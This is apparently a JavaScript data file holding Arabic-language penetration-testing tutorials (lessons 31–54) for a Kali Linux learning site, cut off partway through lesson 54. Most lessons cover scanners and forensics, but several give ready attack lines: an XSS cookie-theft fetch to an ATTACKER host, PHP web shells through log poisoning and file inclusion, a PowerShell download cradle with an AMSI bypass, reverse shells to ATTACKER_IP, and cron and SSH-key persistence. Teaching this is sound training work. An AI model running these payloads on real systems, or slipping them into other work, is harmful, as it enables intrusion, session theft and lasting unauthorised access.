// ============================================================
// TUTORIALS PART 2 - Lessons 31-90
// ============================================================
window.TUTORIALS_PART2 = [
{
  id:31, title:"اختبار XSS - Cross-Site Scripting", icon:"🔗", level:"intermediate", cat:"webapp",
  tags:["XSS","JavaScript","OWASP"],
  desc:"تعلم اكتشاف وإثبات ثغرات XSS وأنواعها الثلاثة بطرق احترافية.",
  steps:[
    { title:"أنواع XSS", text:"XSS ثلاثة أنواع: Reflected وStored وDOM-based. كل نوع له أسلوب اكتشاف مختلف.", cmd:"# Reflected: ?q=PAYLOAD\n# Stored: في حقل التعليقات\n# DOM: #PAYLOAD", cmdDesc:"أنواع XSS وأمثلة أولية" },
    { title:"اكتشاف نقاط الإدخال", text:"أي حقل إدخال أو بارامتر URL هو نقطة اختبار محتملة.", cmd:'curl "http://target.com/search?q=<script>alert(1)</script>"', cmdDesc:"اختبار نقاط الإدخال", note:"إذا ظهر الكود بدون ترميز HTML فهي ثغرة." },
    { title:"Payloads المتقدمة", text:"الفلاتر تحجب alert وscript أحياناً. يوجد payloads تتجاوز الفلاتر.", cmd:"<img src=x onerror=confirm(1)>\n<svg onload=alert(1)>\n<details open ontoggle=alert(1)>", cmdDesc:"Payloads لتجاوز الفلاتر" },
    { title:"سرقة الجلسات", text:"الهدف الحقيقي من XSS هو سرقة session cookie.", cmd:'<script>fetch("http://ATTACKER/?c="+document.cookie)</script>\nnc -lvnp 80', cmdDesc:"سرقة الكوكيز عبر XSS" },
    { title:"XSStrike للأتمتة", text:"XSStrike أداة ذكية تكتشف XSS وتولد payloads تلقائياً.", cmd:'pip3 install xsstrike\nxsstrike -u "http://target.com/search?q=test" --crawl', cmdDesc:"فحص XSS تلقائي", note:"استخدم على بيئات تدريب مثل DVWA." }
  ]
},
{
  id:32, title:"اختبار CSRF وأمان الكوكيز", icon:"🍪", level:"intermediate", cat:"webapp",
  tags:["CSRF","Cookie","Session","OWASP"],
  desc:"فهم واستغلال ثغرات CSRF وضعف إعداد الكوكيز.",
  steps:[
    { title:"ما هو CSRF؟", text:"CSRF يخدع المستخدم لتنفيذ طلبات لم يقصدها مثل تغيير البريد أو تحويل الأموال.", cmd:"<form action='http://target.com/transfer' method='POST'>\n  <input name='amount' value='1000'>\n</form>\n<script>document.forms[0].submit()</script>", cmdDesc:"مثال CSRF بسيط" },
    { title:"اكتشاف CSRF في Burp", text:"تحقق من غياب CSRF Token في النماذج الحساسة.", cmd:"# في Burp Suite:\n# Intercept POST request\n# ابحث عن csrf_token\n# غيابه = ثغرة CSRF", cmdDesc:"اكتشاف CSRF في Burp" },
    { title:"فحص إعدادات الكوكيز", text:"الكوكيز الآمنة تحتاج: Secure, HttpOnly, SameSite.", cmd:'curl -v http://target.com 2>&1 | grep -i "set-cookie"', cmdDesc:"فحص إعدادات الكوكيز" },
    { title:"استغلال Missing SameSite", text:"بدون SameSite الكوكيز ترسل مع طلبات cross-site.", cmd:"fetch('http://target.com/api/delete', {method: 'POST', credentials: 'include'})", cmdDesc:"استغلال غياب SameSite" }
  ]
},
{
  id:33, title:"File Inclusion - LFI وRFI", icon:"📁", level:"intermediate", cat:"webapp",
  tags:["LFI","RFI","PHP","OWASP"],
  desc:"اكتشاف واستغلال ثغرات Local و Remote File Inclusion.",
  steps:[
    { title:"اكتشاف LFI", text:"البحث عن parameters تحمل اسم صفحة أو ملف.", cmd:"curl 'http://target.com/?page=../../../../etc/passwd'\ncurl 'http://target.com/?file=/etc/passwd'", cmdDesc:"اختبار LFI على /etc/passwd" },
    { title:"PHP Wrappers مع LFI", text:"PHP يدعم wrappers لقراءة الكود المصدري.", cmd:"curl 'http://target.com/?page=php://filter/convert.base64-encode/resource=index'\nbase64 -d <<< 'BASE64_HERE'", cmdDesc:"قراءة الكود المصدري" },
    { title:"Log Poisoning للحصول على RCE", text:"أدخل PHP code في User-Agent ثم اقرأ اللوغ عبر LFI.", cmd:"curl -A '<?php system($_GET[cmd]); ?>' http://target.com\ncurl 'http://target.com/?page=/var/log/apache2/access.log&cmd=id'", cmdDesc:"Log Poisoning لتنفيذ الأوامر", note:"يعمل إذا كان Web Server Apache." },
    { title:"Remote File Inclusion", text:"RFI يتيح تضمين ملف خارجي مباشرة.", cmd:"echo '<?php system($_GET[cmd]); ?>' > shell.php\npython3 -m http.server 8080\ncurl 'http://target.com/?page=http://YOUR_IP:8080/shell.php&cmd=id'", cmdDesc:"RFI لتنفيذ كود عن بُعد" }
  ]
},
{
  id:34, title:"كسر كلمات المرور بـ Hashcat", icon:"🔓", level:"intermediate", cat:"exploitation",
  tags:["Hashcat","Password","GPU","Cracking"],
  desc:"إتقان كسر كلمات المرور بكل طرق hashcat من Dictionary حتى Hybrid.",
  steps:[
    { title:"فهم أنواع الهاشات", text:"كل hash له نوع مختلف. Hashcat يدعم 300+ نوع.", cmd:"hashid '5f4dcc3b5aa765d61d8327deb882cf99'\nhash-identifier '5f4dcc3b5aa765d61d8327deb882cf99'", cmdDesc:"التعرف على نوع الهاش" },
    { title:"Dictionary Attack", text:"أسرع وأكثر نجاحاً مع قوائم كلمات المرور الشائعة.", cmd:"hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt\nhashcat -m 1000 ntlm.txt rockyou.txt", cmdDesc:"هجوم القاموس بـ hashcat" },
    { title:"Rule-Based Attack", text:"Rules تحول كلمات القاموس وتضيف أرقام وتغير حالة.", cmd:"hashcat -m 0 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule", cmdDesc:"هجوم بالقواعد" },
    { title:"Brute Force / Mask Attack", text:"Mask يحدد بنية كلمة المرور.", cmd:"hashcat -m 0 hash.txt -a 3 ?l?l?l?l?l?l?l?l\nhashcat -m 0 hash.txt -a 3 ?u?l?l?l?d?d?d", cmdDesc:"Mask Attack لأنماط محددة" },
    { title:"Hybrid Attack", text:"قاموس مع Mask: يضيف أرقام لنهاية كلمات القاموس.", cmd:"hashcat -m 0 hash.txt rockyou.txt -a 6 ?d?d?d?d", cmdDesc:"Hybrid Attack", note:"GPU يسرع الكسر 100 مرة عن CPU." }
  ]
},
{
  id:35, title:"Privilege Escalation على Linux", icon:"⬆️", level:"advanced", cat:"privesc",
  tags:["Linux","Root","SUID","Sudo"],
  desc:"منهجية شاملة لرفع الصلاحيات على Linux من مستخدم عادي إلى root.",
  steps:[
    { title:"جمع معلومات النظام", text:"قبل Privesc اجمع معلومات: نسخة Kernel والمستخدمين.", cmd:"uname -a && id && whoami\ncat /etc/os-release\nps aux | head -20", cmdDesc:"جمع معلومات النظام" },
    { title:"فحص SUID Binaries", text:"SUID يشغل الملف بصلاحيات المالك.", cmd:"find / -perm -4000 -user root 2>/dev/null\nfind / -perm -4000 -type f 2>/dev/null | xargs ls -la", cmdDesc:"البحث عن SUID Binaries" },
    { title:"فحص Sudo Privileges", text:"sudo -l يعرض ما يمكن تنفيذه بـ sudo.", cmd:"sudo -l\n# مثال استغلال find:\nsudo find . -exec /bin/bash \\;", cmdDesc:"استغلال Sudo", note:"GTFOBins.github.io يحتوي استغلالات لكل برنامج." },
    { title:"Cron Jobs Exploitation", text:"Cron Jobs تعمل تلقائياً. Script يعمل كـ root = هدف.", cmd:"cat /etc/crontab && crontab -l\nls -la /etc/cron.* 2>/dev/null", cmdDesc:"استغلال Cron Jobs" },
    { title:"LinPEAS للأتمتة", text:"LinPEAS يفحص كل نقاط الـ Privesc تلقائياً.", cmd:"curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh", cmdDesc:"LinPEAS للفحص التلقائي", note:"المناطق باللون الأحمر = أولوية عالية." }
  ]
},
{
  id:36, title:"Privilege Escalation على Windows", icon:"🪟", level:"advanced", cat:"privesc",
  tags:["Windows","SYSTEM","UAC","Token"],
  desc:"تقنيات رفع الصلاحيات على Windows من User إلى SYSTEM.",
  steps:[
    { title:"جمع معلومات Windows", text:"whoami /all يعرض المستخدم والـ privileges.", cmd:"whoami /all\nsysteminfo\nnet users && net localgroup administrators", cmdDesc:"جمع معلومات النظام" },
    { title:"AlwaysInstallElevated", text:"إذا كان هذا الـ registry key مضبوط = أي MSI يثبت بـ SYSTEM.", cmd:"reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\nreg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated", cmdDesc:"فحص AlwaysInstallElevated" },
    { title:"Unquoted Service Path", text:"خدمة بمسار غير مقتبس = يمكن وضع EXE خبيث.", cmd:"wmic service get name,displayname,pathname,startmode | findstr /i 'auto' | findstr /i /v 'c:\\windows'", cmdDesc:"البحث عن Unquoted Service Paths" },
    { title:"WinPEAS للأتمتة", text:"نظير LinPEAS على Windows.", cmd:"certutil.exe -urlcache -f http://YOUR_IP/winPEASx64.exe winpeas.exe\n.\\winpeas.exe", cmdDesc:"WinPEAS للفحص الآلي" }
  ]
},
{
  id:37, title:"هجمات MITM - Man In The Middle", icon:"🕵️", level:"advanced", cat:"network",
  tags:["ARP Spoofing","MITM","Bettercap"],
  desc:"تقنيات اعتراض الاتصالات في الشبكة المحلية.",
  steps:[
    { title:"ARP Spoofing", text:"ARP بروتوكول بلا مصادقة يمكن استغلاله.", cmd:"echo 1 > /proc/sys/net/ipv4/ip_forward\narpspoof -i eth0 -t VICTIM_IP GATEWAY_IP", cmdDesc:"ARP Spoofing للـ MITM" },
    { title:"Bettercap للـ MITM", text:"Bettercap أقوى من arpspoof.", cmd:"bettercap -iface eth0\nnet.probe on\narp.spoof on\nnet.sniff on", cmdDesc:"MITM بـ Bettercap" },
    { title:"SSL Stripping", text:"تحويل HTTPS إلى HTTP للتجسس.", cmd:"set https.proxy.sslstrip true\nhttps.proxy on", cmdDesc:"SSL Stripping" },
    { title:"DNS Spoofing", text:"تحويل استعلامات DNS لمواقع تحت سيطرتك.", cmd:"set dns.spoof.domains target.com\nset dns.spoof.address YOUR_IP\ndns.spoof on", cmdDesc:"DNS Spoofing", note:"هذه الهجمات مخالفة للقانون على شبكات دون إذن." }
  ]
},
{
  id:38, title:"تحليل Traffic بـ Wireshark", icon:"🦈", level:"intermediate", cat:"network",
  tags:["Wireshark","Packet Analysis","Network"],
  desc:"إتقان تحليل حزم الشبكة باستخدام Wireshark.",
  steps:[
    { title:"التقاط الحزم", text:"Wireshark يلتقط حزم الشبكة من الواجهات.", cmd:"wireshark &\ntshark -i eth0 -w capture.pcap", cmdDesc:"بدء التقاط الحزم" },
    { title:"فلترة الحزم", text:"Display Filters أقوى ميزة في Wireshark.", cmd:"ip.addr == 192.168.1.10\nhttp.request.method == POST\ntcp.port == 80\nhttp contains password", cmdDesc:"فلاتر Wireshark الأساسية" },
    { title:"تحليل HTTP", text:"Follow HTTP Stream يعرض المحادثة الكاملة.", cmd:"tshark -r capture.pcap --export-objects http,exported_files/", cmdDesc:"تحليل واستخراج بيانات HTTP" },
    { title:"اكتشاف الهجمات", text:"Wireshark يساعد في اكتشاف مسح Nmap وARP Spoofing.", cmd:"arp.duplicate-address-detected\ntcp.flags.syn == 1 && tcp.flags.ack == 0\nhttp.response.code == 401", cmdDesc:"اكتشاف الهجمات بـ Wireshark" }
  ]
},
{
  id:39, title:"استخدام John The Ripper", icon:"🔨", level:"intermediate", cat:"exploitation",
  tags:["John","Password Cracking","Hash"],
  desc:"إتقان John The Ripper لكسر كلمات المرور.",
  steps:[
    { title:"كسر هاشات Linux", text:"unshadow يدمج /etc/passwd و/etc/shadow.", cmd:"sudo unshadow /etc/passwd /etc/shadow > combined.txt\njohn combined.txt --wordlist=/usr/share/wordlists/rockyou.txt", cmdDesc:"كسر هاشات Linux بـ John" },
    { title:"كسر ملفات ZIP", text:"zip2john يستخرج الهاش من الملف المضغوط.", cmd:"zip2john protected.zip > zip.hash\njohn zip.hash --wordlist=/usr/share/wordlists/rockyou.txt\njohn zip.hash --show", cmdDesc:"كسر ZIP بكلمة مرور" },
    { title:"Brute Force بـ John", text:"بدون قاموس John يجرب كل التوليفات.", cmd:"john hash.txt --incremental=All\njohn hash.txt --incremental=Digits", cmdDesc:"Brute Force بـ John" },
    { title:"عرض النتائج", text:"John يحفظ التقدم ويمكن استئناف الكسر.", cmd:"john --show combined.txt\njohn --restore\njohn --status", cmdDesc:"عرض وإدارة نتائج John" }
  ]
},
{
  id:40, title:"OSINT - جمع المعلومات المفتوحة", icon:"🔭", level:"beginner", cat:"recon",
  tags:["OSINT","Maltego","theHarvester","Recon"],
  desc:"فن جمع المعلومات عن الهدف من الإنترنت دون الاتصال المباشر.",
  steps:[
    { title:"theHarvester", text:"يجمع إيميلات ونطاقات فرعية من محركات البحث.", cmd:"theHarvester -d target.com -l 500 -b google\ntheHarvester -d target.com -b all -f results.html", cmdDesc:"جمع المعلومات من محركات البحث" },
    { title:"Shodan", text:"Shodan يفهرس الأجهزة المتصلة بالإنترنت.", cmd:"pip3 install shodan\nshodan init YOUR_API_KEY\nshodan search 'org:TargetCompany'\nshodan host 8.8.8.8", cmdDesc:"البحث بـ Shodan" },
    { title:"Google Dorks", text:"استعلامات خاصة للبحث عن معلومات حساسة.", cmd:"site:target.com filetype:pdf\nsite:target.com intitle:'index of'\nsite:target.com inurl:admin", cmdDesc:"Google Dorks الأساسية" },
    { title:"Recon-ng", text:"إطار OSINT مودولار مثل Metasploit.", cmd:"recon-ng\nworkspaces create target_corp\nmodules load recon/domains-hosts/hackertarget\noptions set SOURCE target.com\nrun", cmdDesc:"OSINT بـ Recon-ng" }
  ]
},
{
  id:41, title:"Hydra - Brute Force الشبكي", icon:"🐉", level:"intermediate", cat:"exploitation",
  tags:["Hydra","Brute Force","SSH","FTP"],
  desc:"إتقان Hydra لاختبار كلمات المرور على خدمات الشبكة.",
  steps:[
    { title:"Brute Force SSH", text:"SSH أكثر الخدمات استهدافاً.", cmd:"hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.10\nhydra -L users.txt -P passwords.txt ssh://192.168.1.10 -t 4", cmdDesc:"Brute Force SSH بـ Hydra" },
    { title:"Brute Force FTP", text:"FTP بكلمات مرور ضعيفة شائع جداً.", cmd:"hydra -l admin -P rockyou.txt ftp://192.168.1.10", cmdDesc:"Brute Force FTP" },
    { title:"Brute Force تسجيل دخول الويب", text:"نماذج الويب تحتاج تحديد المعاملات الصحيحة.", cmd:"hydra -l admin -P rockyou.txt http-post-form '192.168.1.10/login.php:username=^USER^&password=^PASS^:Invalid'", cmdDesc:"Brute Force HTTP Login" },
    { title:"Brute Force RDP", text:"RDP مفتوح مع كلمات ضعيفة = خطر كبير.", cmd:"hydra -l Administrator -P rockyou.txt rdp://192.168.1.10", cmdDesc:"Brute Force Windows RDP" }
  ]
},
{
  id:42, title:"Nikto - فحص خوادم الويب", icon:"🔎", level:"beginner", cat:"webapp",
  tags:["Nikto","Web Scanner","Apache"],
  desc:"استخدام Nikto لفحص خوادم الويب وإيجاد الثغرات.",
  steps:[
    { title:"فحص أساسي بـ Nikto", text:"Nikto يفحص مئات الثغرات المعروفة تلقائياً.", cmd:"nikto -h http://192.168.1.10\nnikto -h https://target.com", cmdDesc:"فحص Nikto الأساسي" },
    { title:"فحص منفذ محدد", text:"إذا كان الخادم على منفذ غير افتراضي.", cmd:"nikto -h 192.168.1.10 -p 8080\nnikto -h 192.168.1.10 -p 443 -ssl", cmdDesc:"فحص منفذ محدد" },
    { title:"حفظ النتائج", text:"Nikto يدعم صيغ متعددة للتقارير.", cmd:"nikto -h target.com -o report.html -Format html\nnikto -h target.com -o report.xml -Format xml", cmdDesc:"حفظ نتائج Nikto" },
    { title:"Nikto مع Proxy", text:"توجيه نتائج Nikto عبر Burp Suite.", cmd:"nikto -h target.com -useproxy http://127.0.0.1:8080", cmdDesc:"Nikto مع Burp Proxy", note:"Nikto يترك أثراً واضحاً. استخدمه على بيئات مرخصة فقط." }
  ]
},
{
  id:43, title:"SQLMap - استغلال SQL Injection تلقائياً", icon:"💉", level:"intermediate", cat:"webapp",
  tags:["SQLMap","SQL Injection","Database"],
  desc:"إتقان SQLMap لاكتشاف واستغلال ثغرات SQL Injection.",
  steps:[
    { title:"أول فحص بـ SQLMap", text:"أعطِ SQLMap URL مع parameter مشبوه.", cmd:"sqlmap -u 'http://target.com/page?id=1'\nsqlmap -u 'http://target.com/page?id=1' --dbs", cmdDesc:"أول فحص SQLi" },
    { title:"استخراج قواعد البيانات", text:"استخرج كامل هيكل قاعدة البيانات.", cmd:"sqlmap -u 'http://target.com/page?id=1' --dbs\nsqlmap -u 'http://target.com/page?id=1' -D target_db --tables\nsqlmap -u 'http://target.com/page?id=1' -D target_db -T users --columns", cmdDesc:"استخراج هيكل قاعدة البيانات" },
    { title:"استخراج البيانات", text:"استخرج محتوى الجداول.", cmd:"sqlmap -u 'http://target.com/page?id=1' -D target_db -T users -C username,password --dump", cmdDesc:"استخراج بيانات المستخدمين" },
    { title:"الحصول على Shell", text:"إذا كان الخادم يتيح كتابة ملفات.", cmd:"sqlmap -u 'http://target.com/page?id=1' --os-shell", cmdDesc:"الحصول على OS Shell", note:"تحتاج FILE privilege في MySQL." }
  ]
},
{
  id:44, title:"تحليل الـ Malware بـ Kali", icon:"🦠", level:"advanced", cat:"forensics",
  tags:["Malware","Reverse Engineering","strings"],
  desc:"تقنيات التحليل الأساسية للـ Malware على Linux.",
  steps:[
    { title:"التحليل الاستاتيكي الأولي", text:"قبل تشغيل أي ملف مشبوه حلله استاتيكياً.", cmd:"file suspicious_file\nmd5sum suspicious_file && sha256sum suspicious_file\nstrings suspicious_file | head -50", cmdDesc:"التحليل الاستاتيكي" },
    { title:"فحص VirusTotal", text:"ابحث عن الـ hash في VirusTotal.", cmd:"sha256sum suspicious_file\n# ابحث على: https://www.virustotal.com", cmdDesc:"التحقق من VirusTotal" },
    { title:"Dynamic Analysis في Sandbox", text:"Cuckoo Sandbox ينفذ الملف في بيئة معزولة.", cmd:"pip install -U cuckoo\ncuckoo init && cuckoo web", cmdDesc:"تحليل ديناميكي بـ Cuckoo" },
    { title:"Reverse Engineering بـ Ghidra", text:"Ghidra أداة NSA مجانية لتفكيك الكود الثنائي.", cmd:"apt install ghidra\nghidraRun", cmdDesc:"فتح ملف بـ Ghidra", note:"لا تشغل Malware على جهازك الرئيسي. استخدم VM معزولة." }
  ]
},
{
  id:45, title:"Kali في Docker", icon:"🐳", level:"intermediate", cat:"basics",
  tags:["Docker","Container","Kali","DevSecOps"],
  desc:"تشغيل Kali Linux داخل Docker لبيئات اختبار معزولة.",
  steps:[
    { title:"تثبيت Docker وتشغيل Kali", text:"Docker يتيح بيئة Kali نظيفة في ثوانٍ.", cmd:"apt install docker.io -y\ndocker pull kalilinux/kali-rolling\ndocker run -it kalilinux/kali-rolling /bin/bash", cmdDesc:"تشغيل Kali في Docker" },
    { title:"تثبيت الأدوات في Container", text:"ثبّت الأدوات التي تحتاجها فقط.", cmd:"apt update\napt install -y nmap netcat python3 curl\napt install -y kali-tools-web", cmdDesc:"تثبيت أدوات Kali" },
    { title:"مشاركة الملفات مع Container", text:"-v يربط مجلد محلي بالـ Container.", cmd:"docker run -it -v /home/user/pentest:/opt/results kalilinux/kali-rolling /bin/bash", cmdDesc:"مشاركة الملفات مع Docker" },
    { title:"Dockerfile لبيئة مخصصة", text:"أنشئ صورة Docker مخصصة مع أدواتك المفضلة.", cmd:"FROM kalilinux/kali-rolling\nRUN apt update && apt install -y nmap sqlmap nikto\nWORKDIR /opt/pentest\nCMD [\"/bin/bash\"]\n# docker build -t my-kali .", cmdDesc:"إنشاء Kali Container مخصص" }
  ]
},
{
  id:46, title:"Burp Suite - الدليل الشامل", icon:"🕷️", level:"intermediate", cat:"webapp",
  tags:["Burp Suite","Proxy","Repeater","Intruder"],
  desc:"إتقان Burp Suite من الإعداد حتى الاستخدام الاحترافي.",
  steps:[
    { title:"إعداد Burp Suite والـ Proxy", text:"Burp يعترض الطلبات بين المتصفح والخادم.", cmd:"burpsuite &\n# إعداد Firefox:\n# Settings > Network > Manual Proxy: 127.0.0.1:8080\n# تثبيت Certificate من: http://burp", cmdDesc:"إعداد Burp Suite مع Firefox" },
    { title:"Intercepting الطلبات", text:"Intercept يوقف الطلب للتعديل قبل إرساله.", cmd:"# في Burp Suite:\n# Proxy > Intercept > ON\n# عدّل قيمة parameter\n# Forward لإرساله", cmdDesc:"اعتراض وتعديل الطلبات" },
    { title:"Repeater - إعادة الطلبات", text:"Repeater يرسل نفس الطلب مرات عديدة مع تعديلات.", cmd:"# Right Click > Send to Repeater\n# عدّل الـ parameter\n# اضغط Send", cmdDesc:"استخدام Repeater لاختبار الثغرات" },
    { title:"Intruder - هجمات تلقائية", text:"Intruder يرسل آلاف الطلبات مع تغيير قيم محددة.", cmd:"# Positions: حدد نقطة الهجوم\n# Payloads: أضف قائمة كلمات\n# Start Attack", cmdDesc:"هجوم Intruder على تسجيل الدخول" }
  ]
},
{
  id:47, title:"Gobuster - فحص المجلدات المخفية", icon:"🗂️", level:"beginner", cat:"webapp",
  tags:["Gobuster","Directory Brute Force","Web"],
  desc:"اكتشاف المجلدات والملفات المخفية على خوادم الويب.",
  steps:[
    { title:"فحص المجلدات الأساسي", text:"Gobuster يجرب أسماء مجلدات من قاموس.", cmd:"gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt\ngobuster dir -u http://target.com -w big.txt", cmdDesc:"فحص المجلدات بـ Gobuster" },
    { title:"فحص امتدادات محددة", text:"-x يبحث عن امتدادات محددة.", cmd:"gobuster dir -u http://target.com -w common.txt -x php,html,txt,bak", cmdDesc:"فحص امتدادات محددة" },
    { title:"فحص النطاقات الفرعية", text:"DNS mode يكتشف النطاقات الفرعية.", cmd:"gobuster dns -d target.com -w subdomains.txt", cmdDesc:"اكتشاف Subdomains" },
    { title:"ffuf - فحص متعدد", text:"ffuf أداة fuzzing شاملة.", cmd:"ffuf -w big.txt -u http://target.com/FUZZ\nffuf -w subs.txt -u http://FUZZ.target.com -H 'Host: FUZZ.target.com'", cmdDesc:"فحص شامل بـ ffuf" }
  ]
},
{
  id:48, title:"مسح الثغرات بـ OpenVAS", icon:"🛡️", level:"intermediate", cat:"scanning",
  tags:["OpenVAS","Vulnerability Scanner","GVM"],
  desc:"إعداد واستخدام OpenVAS لفحص الثغرات.",
  steps:[
    { title:"تثبيت OpenVAS", text:"OpenVAS أقوى ماسح ثغرات مفتوح المصدر.", cmd:"apt install gvm -y\ngvm-setup\ngvm-check-setup", cmdDesc:"تثبيت GVM/OpenVAS" },
    { title:"تشغيل OpenVAS", text:"شغّل الخدمات وافتح الواجهة.", cmd:"gvm-start\n# افتح: https://127.0.0.1:9392", cmdDesc:"تشغيل OpenVAS" },
    { title:"إنشاء مهمة فحص", text:"Configuration > Targets > New Target.", cmd:"# واجهة ويب:\n# 1. Configuration > Targets > New\n# 2. Scans > Tasks > New Task\n# 3. Save > Start", cmdDesc:"إنشاء مهمة فحص" },
    { title:"تحليل النتائج", text:"OpenVAS يصنف الثغرات حسب الخطورة.", cmd:"# Reports > Download > PDF/XML", cmdDesc:"تحليل تقرير OpenVAS", note:"تحديث دوري: gvm-feed-update" }
  ]
},
{
  id:49, title:"PowerShell للهجوم والدفاع", icon:"💻", level:"advanced", cat:"exploitation",
  tags:["PowerShell","Windows","Red Team"],
  desc:"استخدام PowerShell في اختبار الاختراق على Windows.",
  steps:[
    { title:"PowerShell Execution Policy", text:"تجاوز قيود تشغيل السكريبتات.", cmd:"powershell -ExecutionPolicy Bypass -File script.ps1\npowershell -c \"IEX(New-Object Net.WebClient).downloadstring('http://IP/script.ps1')\"", cmdDesc:"تجاوز Execution Policy" },
    { title:"جمع معلومات النظام بـ PS", text:"PowerShell يوفر وصولاً عميقاً لمعلومات Windows.", cmd:"Get-ComputerInfo\nGet-LocalUser\nGet-LocalGroupMember Administrators", cmdDesc:"جمع معلومات النظام" },
    { title:"تحميل وتشغيل من الذاكرة", text:"Fileless Attack: تشغيل كود مباشرة من الذاكرة.", cmd:"IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER/script.ps1')", cmdDesc:"Fileless Attack بـ PowerShell" },
    { title:"AMSI Bypass", text:"AMSI يفحص سكريبتات PowerShell. تجاوزه لتشغيل أدوات offensive.", cmd:"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)", cmdDesc:"تجاوز AMSI", note:"هذه التقنيات مراقبة من EDR." }
  ]
},
{
  id:50, title:"Reverse Shell وأساليب الوصول الدائم", icon:"🔄", level:"advanced", cat:"exploitation",
  tags:["Reverse Shell","Netcat","Persistence"],
  desc:"الحصول على Reverse Shell وتثبيت وصول دائم.",
  steps:[
    { title:"Netcat Reverse Shell", text:"أبسط طريقة للحصول على shell عكسي.", cmd:"# المهاجم:\nnc -lvnp 4444\n# الضحية:\nbash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1", cmdDesc:"Reverse Shell بـ Netcat" },
    { title:"Shells بـ Python وPHP", text:"Python وPHP بدائل شائعة.", cmd:"python3 -c \"import socket,subprocess,os;s=socket.socket();s.connect(('ATTACKER',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);subprocess.call(['/bin/bash'])\"", cmdDesc:"Reverse Shell بـ Python" },
    { title:"تحسين Shell TTY", text:"تحويل Shell لـ TTY كامل.", cmd:"python3 -c \"import pty;pty.spawn('/bin/bash')\"\n# Ctrl+Z\nstty raw -echo; fg\nexport TERM=xterm", cmdDesc:"تحويل Shell لـ TTY" },
    { title:"الوصول الدائم على Linux", text:"Persistence يضمن الوصول بعد إعادة التشغيل.", cmd:"(crontab -l; echo '@reboot bash -i >& /dev/tcp/IP/4444 0>&1') | crontab -\nmkdir ~/.ssh && echo 'YOUR_PUBLIC_KEY' >> ~/.ssh/authorized_keys", cmdDesc:"Persistence على Linux" }
  ]
},
{
  id:51, title:"التحليل الجنائي الرقمي", icon:"🔬", level:"advanced", cat:"forensics",
  tags:["Forensics","Autopsy","Volatility"],
  desc:"مبادئ التحليل الجنائي الرقمي: جمع الأدلة وتحليل الذاكرة.",
  steps:[
    { title:"أخذ صورة القرص", text:"لا تعمل على الدليل الأصلي. خذ نسخة بـ dd.", cmd:"dd if=/dev/sdb of=disk_image.dd bs=512 status=progress\ndd if=/dev/sdb | tee disk_image.dd | md5sum > disk.md5", cmdDesc:"أخذ صورة قرص للتحليل" },
    { title:"تحليل القرص بـ Autopsy", text:"Autopsy واجهة بصرية قوية للتحليل.", cmd:"apt install autopsy\nautopsy &\n# افتح http://127.0.0.1:9999/autopsy", cmdDesc:"تحليل صورة القرص بـ Autopsy" },
    { title:"تحليل الذاكرة بـ Volatility", text:"Volatility يحلل dumps الذاكرة.", cmd:"volatility3 -f memory.dmp windows.pslist\nvolatility3 -f memory.dmp windows.netscan\nvolatility3 -f memory.dmp windows.malfind", cmdDesc:"تحليل RAM dump بـ Volatility" },
    { title:"استعادة الملفات المحذوفة", text:"Testdisk يستعيد ملفات محذوفة.", cmd:"testdisk disk_image.dd\nphotorec disk_image.dd", cmdDesc:"استعادة الملفات المحذوفة" }
  ]
},
{
  id:52, title:"Nessus - فحص الثغرات الاحترافي", icon:"🧪", level:"intermediate", cat:"scanning",
  tags:["Nessus","Tenable","Vulnerability Assessment"],
  desc:"استخدام Nessus لفحص الثغرات في بيئات المؤسسات.",
  steps:[
    { title:"تثبيت Nessus Essentials", text:"مجاني لـ 16 IP.", cmd:"# تنزيل من: https://www.tenable.com/products/nessus/nessus-essentials\ndpkg -i Nessus-*.deb\nsystemctl start nessusd\n# افتح: https://localhost:8834", cmdDesc:"تثبيت Nessus" },
    { title:"إنشاء Scan جديد", text:"Nessus يوفر قوالب جاهزة.", cmd:"# New Scan > Basic Network Scan\n# حدد الهدف\n# Save > Launch", cmdDesc:"إنشاء وتشغيل فحص Nessus" },
    { title:"Credentialed Scan", text:"Nessus مع credentials يكتشف ثغرات أعمق.", cmd:"# Credentials > SSH أو Windows\n# Username + Password أو Key", cmdDesc:"فحص موثق" },
    { title:"تصدير التقارير", text:"Nessus يصدر تقارير PDF احترافية.", cmd:"# Report > Export > PDF\n# Executive Report للمدراء", cmdDesc:"تصدير تقارير Nessus" }
  ]
},
{
  id:53, title:"CTF - التحقيق الجنائي في الصور", icon:"🖼️", level:"intermediate", cat:"forensics",
  tags:["Steganography","CTF","ExifTool"],
  desc:"اكتشاف البيانات المخفية في الصور في مسابقات CTF.",
  steps:[
    { title:"ExifTool - البيانات الوصفية", text:"يكشف بيانات metadata مخفية.", cmd:"exiftool image.jpg\nexiftool -all image.png | grep -v '^\\s*$'", cmdDesc:"فحص Metadata بـ ExifTool" },
    { title:"Steghide - استخراج البيانات", text:"يستخرج ملفات مخفية داخل صور.", cmd:"steghide extract -sf image.jpg\nsteghide extract -sf image.jpg -p 'password'", cmdDesc:"استخراج البيانات المخفية" },
    { title:"Binwalk - ملفات داخل ملفات", text:"يكتشف ويستخرج ملفات مضمنة.", cmd:"binwalk image.jpg\nbinwalk -e image.jpg\nbinwalk -Me image.jpg", cmdDesc:"استخراج ملفات مضمنة" },
    { title:"Strings وتحليل ثنائي", text:"strings يبحث عن نص في ملف ثنائي.", cmd:"strings image.jpg | grep -i flag\nxxd image.jpg | head -20", cmdDesc:"تحليل ثنائي للبحث عن Flags" }
  ]
},
{
  id:54, title:"Enumeration بعد الاختراق", icon:"🗺️", level:"intermediate", cat:"exploitation",
  tags:["Post Exploitation","Meterpreter","Pivoting"],
  desc:"ماذا تفعل بعد الدخول؟ منهجية شاملة لجمع المعلومات.",
  steps:[
